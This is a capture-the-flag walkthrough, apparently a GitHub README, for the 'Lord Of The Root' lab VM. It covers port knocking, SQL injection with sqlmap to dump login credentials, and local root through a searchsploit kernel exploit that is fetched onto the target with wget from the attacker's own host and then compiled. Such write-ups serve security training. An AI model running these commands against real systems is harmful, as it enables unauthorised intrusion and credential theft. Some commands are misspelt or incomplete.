# Lord-Of-Root-walk-through

# 0. GEt The VM ip 

netdiscover -r 192.168.1.0/24

ip is 192.168.1.2

# 1. Enumeration 

nmap -sVC -Pn  -p- 192.168.1.2 --script vuln 

Only SSH is available 

# 1.2 enumerate ssh 

ssh 192.168.1.2

![image](https://user-images.githubusercontent.com/52453415/129258686-3f37d68b-d3c5-4ce0-a795-fd5d8af7d8c4.png)

# 1.3 Knock to see what happens 


nock 192.168.1.2 1 2 3

# 1.4 scan again

nmap -sVC -Pn  -p- 192.168.1.2 --script vuln 

looks like the knocking opened http service for us on port 1337 

sounds like there is directory listing on /images/


# 1.5 Enumerate Web server 

http://192.168.1.2:1337 

![image](https://user-images.githubusercontent.com/52453415/129260692-afc54a91-9944-45f9-9d2e-090e361b0c1a.png)


checking the page source , nothing

checking dir /images/

![image](https://user-images.githubusercontent.com/52453415/129261283-3f0f99ec-2d30-4938-a4e4-c8881e16acb6.png)


# 1.6 brute force for files 

using dirbuster i found ; index.php and  index.html

checking the page source for index.html 

![image](https://user-images.githubusercontent.com/52453415/129259855-9c864caf-188b-46f6-9b3f-78312d074d26.png)

i found interesting encoded line 

lets decode it using https://www.base64decode.org/


![image](https://user-images.githubusercontent.com/52453415/129260107-e8283702-0a53-456f-8ebf-590a0585b4b8.png)

decode the first part again 

![image](https://user-images.githubusercontent.com/52453415/129260228-7ee62075-bff3-4b5b-95ab-23901c2d3249.png)

we get url for login page 

the page source does not reveal any thing useful 

the page is not vulnerable to user enumeration 

# 2. Checking SQli 

using sqlmap 

sqlmap -u 'http://192.168.1.2:1337/978345210/index.php' --data='username=username&password=password&submit=' --dump -batch

i found these credentials 

![image](https://user-images.githubusercontent.com/52453415/129261439-5d72c971-3d3f-414f-b37c-54a5a524f9b9.png)

# 2.1 gaining access 

uses these plaintext creds fo smeagol i got a limitted shell

# 3. priv Esc 

sudo -l ; doesn't work 

uname -a 

from my terminals $ searchsploit for ubuntu 4.14 

![image](https://user-images.githubusercontent.com/52453415/129261918-c728c23d-2153-4c1b-87b2-f1af59c81d77.png)

cloning the exploit 

$ searchsploit -m 37292.c 

# 3.1 transfer the exploit to the target 


My terminal : python -m 

target terminal :  wget hhtp://192.168.1.3:8000/37292.c 

![image](https://user-images.githubusercontent.com/52453415/129262328-789807a8-2556-42f1-8ffa-2cf6f0da4d86.png)

gcc exploit.c -o exploit 

./exploit 

whoami 

root







